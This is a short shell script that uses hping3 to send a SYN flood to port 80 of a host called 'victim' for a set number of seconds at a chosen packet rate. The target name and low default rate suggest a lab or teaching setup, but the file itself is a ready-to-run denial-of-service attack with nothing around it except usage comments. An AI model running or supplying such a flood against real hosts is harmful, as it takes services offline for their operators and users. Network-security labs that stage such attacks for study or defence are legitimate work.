#!/bin/sh
# SYN flood against the victim's web port (a "DoS" attack).
# Usage: synflood.sh [seconds] [microseconds_between_packets]    defaults 20 and 5000 (about 200 packets/s)
DURATION="${1:-20}"
GAP="${2:-5000}"
echo "SYN flood: ${DURATION}s, about $((1000000 / GAP)) packets per second, target: victim:80"
timeout "$DURATION" hping3 -S -p 80 -i "u${GAP}" victim
echo "SYN flood finished"
